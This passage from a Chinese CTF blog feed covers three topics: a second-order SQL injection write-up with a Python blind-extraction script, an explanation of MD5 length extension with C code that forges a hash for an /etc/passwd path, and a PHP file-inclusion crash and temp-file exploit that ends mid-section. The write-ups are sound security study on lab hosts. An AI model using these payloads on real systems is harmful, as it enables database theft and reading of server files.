        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[过滤逗号|ascii|from for|substr]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803133553856.png" alt="image-20210803133553856"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>扫目录扫出<code>register.php</code>，真无语，又要扫</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803140744991.png" alt="image-20210803140744991"></p><p>好活</p><p>没想到是二次注入，注入点在register.php的username里</p><p>fuzz一下看看过滤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803154649246.png" alt="image-20210803154649246"></p><p>这俩被屏蔽了</p><p>测试下</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;123@qq.com&amp;username&#x3D;1&#39;and &#39;0&amp;password&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再登录，用户名处显示为0，果然是二次注入，而且是单引号闭合</p><p>试了下#和–注释不太行，得老老实实用单引号了。</p><h3 id="Mysql-字符串运算"><a href="#Mysql-字符串运算" class="headerlink" title="Mysql 字符串运算"></a>Mysql 字符串运算</h3><p>来复习下mysql的字符串运算</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select &#39;1&#39; + &#39;2&#39;# 3select &#39;1&#39;+database()+&#39;0&#39;;#1select &#39;0&#39;+hex(database())+&#39;0&#39;;#776562 -&gt; web的16进制select &#39;0&#39;+ascii(substr(database(),1,1))+&#39;0&#39;;#119 -&gt; w的ascii码select &#39;0&#39;+ascii(substr(database() from 1 for 1))+&#39;0&#39;;##119 -&gt; w的ascii码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以思路就很明确了。就这样慢慢爬吧</p><p>正好前几天复习了爬虫，写个一键脚本，方便看结果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> random<span class="token keyword">import</span> timeresult <span class="token operator">=</span> <span class="token string">''</span>last <span class="token operator">=</span> <span class="token string">'tmp'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token string">"0'+ascii(substr(database() from &#123;&#125; for 1))+'0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'@qq.com'</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://1659e029-c62b-428e-81b6-6b343a56587c.node4.buuoj.cn/register.php"</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"3catttkq2fc27pht26qm7qn5c2"</span><span class="token punctuation">&#125;</span>    burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>                     <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn/register.php"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>    burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    r1 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span>                      cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>    burp0_url <span class="token operator">=</span> <span class="token string">"http://1659e029-c62b-428e-81b6-6b343a56587c.node4.buuoj.cn/login.php"</span>    burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"3catttkq2fc27pht26qm7qn5c2"</span><span class="token punctuation">&#125;</span>    burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>                     <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://aebf4e11-928d-4a24-9890-f86e31989bb0.node4.buuoj.cn/login.php"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>    burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    r2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span>                      cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span> class_<span class="token operator">=</span><span class="token string">'user-name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>string<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 用xpath获取元素</span>    <span class="token comment"># from lxml import etree</span>    <span class="token comment"># html = etree.HTML(r2.text)</span>    <span class="token comment"># name = html.xpath('//*[@id="menu"]/div/div/span//text()')[0].strip()</span>    last <span class="token operator">=</span> result    <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> last<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]'</span><span class="token operator">+</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803173725427-16279834459281.png" alt="image-20210803173725427"></p><p>可行</p><p>那些来就继续跑脚本吧</p><p>值得一提的事表名不知道，是flag，得猜。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">username <span class="token operator">=</span> <span class="token string">"0'+ascii(substr((select * from flag) from &#123;&#125; for 1))+'0"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/image-20210803173933309-16279835738782-16279835744473.png" alt="image-20210803173933309"></p><p>结束</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5长度扩展攻击</title>
      <link href="/p/1343946995.html"/>
      <url>/p/1343946995.html</url>
      
        <content type="html"><![CDATA[<h2 id="MD5原理"><a href="#MD5原理" class="headerlink" title="MD5原理"></a>MD5原理</h2><blockquote><p>1.MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算<br>2.我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。<br>3.MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！</p></blockquote><h3 id="1-填充-增加长度"><a href="#1-填充-增加长度" class="headerlink" title="1.填充+增加长度"></a>1.填充+增加长度</h3><p>将数据进行填充，首先添加<code>0×80</code>，接着添加<code>0×00</code>使得(新字符串字节数+8)%64=0，8个字节存的是原始字符串长度</p><pre class="line-numbers language-none"><code class="language-none">len(secret) + len(&quot;test.pdf&quot;) + len(padding) + 8 &#x3D;&#x3D; 64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>举例：</p><p>字符串：admin，16进制：0x61646d696e</p><blockquote><p>二进制：1111 1111</p><p>16进制：F    F</p><p>ASCII：1字符=1字节(Byte)==8位(bit)</p></blockquote><p>第一步：</p><p>0x61646d696e后面补二进制1000 0000 0000 000000000…</p><p>所以第一个数的16进制数为8</p><p>一直补到bit数=448，目的是**(bit mod 512)=(448 mod 512)**</p><p>448位(bit)=56字节(Byte)=112个十六进制数</p><pre class="line-numbers language-none"><code class="language-none">admin:0x61646d696e补：800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第二步：</p><p>补需要加密明文的长度，admin长度为5，也就是5*8=40位=0x28h</p><blockquote><p>MD5中存储的都是小端方式,0x12345678存储的时候是78 56 34 12</p></blockquote><p>所以后面的64位=8字节=16个十六进制数为</p><pre class="line-numbers language-none"><code class="language-none">2800000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>合一下，就是：</p><pre class="line-numbers language-none"><code class="language-none">0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-轮次变换"><a href="#2-轮次变换" class="headerlink" title="2.轮次变换"></a>2.轮次变换</h3><p>以64字节=512位为1组进行轮次变换，这一组中以4字节为1个单位分成16子分组。</p><p>然后准备ABCD四个32位的字符，这几个是固定的MD5算法特征值。</p><blockquote><p>物理顺序：A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210</p><p>MD5以小端存储：A=0×67452301, B=0xEFCDAB89, C=0x98BADCFE, D=0×10325476</p></blockquote><p>将ABCD作为种子，与16个子分组进行一种<strong>复杂的运算</strong>，运算结果为A1、B1、C1、D1,</p><p>以A1、B1、C1、D1为种子然后重复这个过程计算最后得到An、Bn、Cn、Dn。</p><p><img src="/../images/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/5b5d9ca7bf5e2.png" alt="5b5d9ca7bf5e2"></p><h2 id="扩展攻击"><a href="#扩展攻击" class="headerlink" title="扩展攻击"></a>扩展攻击</h2><blockquote><p>如何在不知道<strong>salt/key/secret</strong>的情况下，计算出一个文件名的合法hash值</p></blockquote><p>前面说到填充，就是长度扩展攻击的关键所在。</p><p><code>M1=md5(secret+&#39;test.pdf&#39;)</code></p><p><code>M2=md5(secret+&#39;flag.txt&#39;)</code></p><p>secret的长度为10,<code>M1</code>=6543109bb53887f7bb46fe424f26e24a,求<code>M2</code></p><p>于是，先填充，将其补充到64Byte</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"test.pdf"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padding<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10+8+x+8=64，x=38,也就是说填充的长度为38Byte:<code>0x80</code>+<code>0x00</code>*37</p><pre class="line-numbers language-none"><code class="language-none">secret + &quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + &quot;\x90\x00\x00\x00\x00\x00\x00\x00&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的话，长度就为64Byte，满足第一轮的计算块，后续再加内容就是新的计算块。</p><blockquote><p>当一个块计算完成后，ABCD四个寄存器中的值就是刚计算完的 hash 值，如果后面还有数据块，那么会在已有的ABCD四个寄存器中的值上进行更新</p></blockquote><p>构造文件名为</p><pre class="line-numbers language-none"><code class="language-none">&quot;test.pdf&quot; + &quot;\x80&quot; + &quot;\x00&quot;*37 + &quot;\x90\x00\x00\x00\x00\x00\x00\x00&quot;+&#39;flag.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是，第一轮计算块，结果就是<code>M1</code>,这是一个合法值，将<code>M1</code>放入下一轮计算块的ABCD寄存器。去计算<code>flag.txt</code>,<strong>合法的ABCD得出也是合法的hash</strong>，于是就算出了<code>M2</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><img src="/../images/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20210802231206242.png" alt="image-20210802231206242"></p><p>用C语言复现下其操作就是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;openssl/md5.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>MD5_DIGEST_LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>  MD5_CTX c<span class="token punctuation">;</span>  <span class="token function">MD5_Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//64个A无所谓是什么,只是让它完成第一个计算块</span>  <span class="token function">MD5_Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">,</span> <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//M1=0x6543109bb53887f7bb46fe424f26e24a，注意大小端</span>  c<span class="token punctuation">.</span>A <span class="token operator">=</span> <span class="token number">0x9b104365</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>B <span class="token operator">=</span> <span class="token number">0xf78738b5</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>C <span class="token operator">=</span> <span class="token number">0x42fe46bb</span><span class="token punctuation">;</span>  c<span class="token punctuation">.</span>D <span class="token operator">=</span> <span class="token number">0x4ae2264f</span><span class="token punctuation">;</span>  <span class="token function">MD5_Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c<span class="token punctuation">,</span> <span class="token string">"/../../../../etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MD5_Final</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://lightless.me/archives/hash-extender-attack.html">哈希长度扩展攻击</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[NPUCTF2020]ezinclude</title>
      <link href="/p/2193317358.html"/>
      <url>/p/2193317358.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[临时文件包含|session|条件竞争|segment fault|session.upload_progress]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802163522235.png" alt="image-20210802163522235"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802164104898.png" alt="image-20210802164104898"></p><p>一看疑似hash长度扩展攻击，转头花了几个小时学了下。</p><p>结果不是，可惜了。</p><p>直接?pass=fa25e54758d5d5c1927781a6ede89f8a</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802231716300.png" alt="image-20210802231716300"></p><p>文件包含</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802231817384.png" alt="image-20210802231817384"></p><p>包含../../../../../../flag，没有结果，看来没那么简单。</p><p>伪协议读一下源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了下<code>file[]=php://input</code>远程执行命令不太行。</p><p>扫目录扫出dir.php,源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h3><blockquote><ol><li>PHP版本&lt;7.2，segment fault特性，向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</li><li>条件竞争：利用session.upload_progress进行session文件包含</li><li>条件竞争：利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除</li></ol></blockquote><h4 id="利用segment-fault特性"><a href="#利用segment-fault特性" class="headerlink" title="利用segment fault特性"></a>利用segment fault特性</h4><p>php版本是7.0.33，这里预期解是1号情况。</p><ul><li><p>php&lt;7.2</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>php7老版本通杀</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><pre class="line-numbers language-none"><code class="language-none">import requestsfrom io import BytesIOurl&#x3D;&quot;http:&#x2F;&#x2F;f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;files&#x3D;&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打进去后，提示实例无法访问，因为崩溃了嘛</p><p>产生临时文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802234200446.png" alt="image-20210802234200446"></p><p>之后再文件包含下，flag在phpinfo里</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezinclude/image-20210802234243611.png" alt="image-20210802234243611"></p><h4 id="条件竞争：利用session-upload-progress"><a href="#条件竞争：利用session-upload-progress" class="headerlink" title="条件竞争：利用session.upload_progress"></a>条件竞争：利用session.upload_progress</h4><blockquote><p>在PHP&gt;5.4，<code>session.upload_progress.enabled</code>这个参数在<code>php.ini</code>中默认开启，在上传的过程中会生成上传进度文件，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ，它的存储路径可以在<code>phpinfo</code>中查到</p></blockquote><p>php&gt;5.4,尝试利用session.upload_progress进行session文件包含</p><ul><li><p>开启upload_progress功能<br>session.upload_progress.enabled = on</p></li><li><p>当文件上传结束后，php将会立即清空对应session文件中的内容<br>session.upload_progress.cleanup = on</p></li></ul><blockquote><p>session.upload_progress.prefix = “upload_progress_”<br>session.upload_progress.name = 